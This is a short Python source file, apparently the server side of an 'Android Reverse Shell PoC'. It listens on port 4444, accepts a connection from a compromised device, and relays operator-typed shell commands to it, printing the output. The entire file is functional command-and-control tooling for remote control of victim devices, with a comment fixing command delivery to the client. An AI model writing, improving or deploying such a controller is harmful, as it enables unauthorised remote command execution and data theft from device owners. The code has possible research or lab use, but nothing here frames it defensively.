import socket

def main():
    """
    A simple C2 server for the Android Reverse Shell PoC.
    Listens for a connection, allows command execution, and prints the output.
    """
    host = '0.0.0.0'  # Listen on all available network interfaces
    port = 4444

    # Create a socket object
    # AF_INET for IPv4, SOCK_STREAM for TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"[*] Listening for connections on {host}:{port}...")
        
        # Bind the socket to the address and port
        s.bind((host, port))
        
        # Listen for incoming connections (1 connection at a time)
        s.listen(1)
        
        # Accept a connection
        conn, addr = s.accept()
        with conn:
            print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
            
            # Receive the initial greeting from the client
            greeting = conn.recv(1024).decode('utf-8', errors='ignore').strip()
            print(f"[+] Client says: {greeting}")

            while True:
                try:
                    # Get command input from the user (the "attacker")
                    command = input(">> ")
                    if command.lower() in ['exit', 'quit']:
                        break
                    if not command:
                        continue

                    # --- THIS IS THE FIX ---
                    # Add a newline character so readLine() on the client knows the command is complete.
                    command_with_newline = command + '\n'
                    
                    # Send the command to the client
                    conn.sendall(command_with_newline.encode('utf-8'))

                    # Receive the command output from the client
                    print("[*] Receiving output...")
                    output = ""
                    while True:
                        data = conn.recv(4096).decode('utf-8', errors='ignore')
                        if "END_OF_COMMAND" in data:
                            output += data.replace("END_OF_COMMAND", "")
                            break
                        output += data
                    
                    print(output.strip())

                except KeyboardInterrupt:
                    print("\n[*] User interrupted. Closing connection.")
                    break
                except Exception as e:
                    print(f"[!] An error occurred: {e}")
                    break
    print("[*] Server shutting down.")

if __name__ == '__main__':
    main()
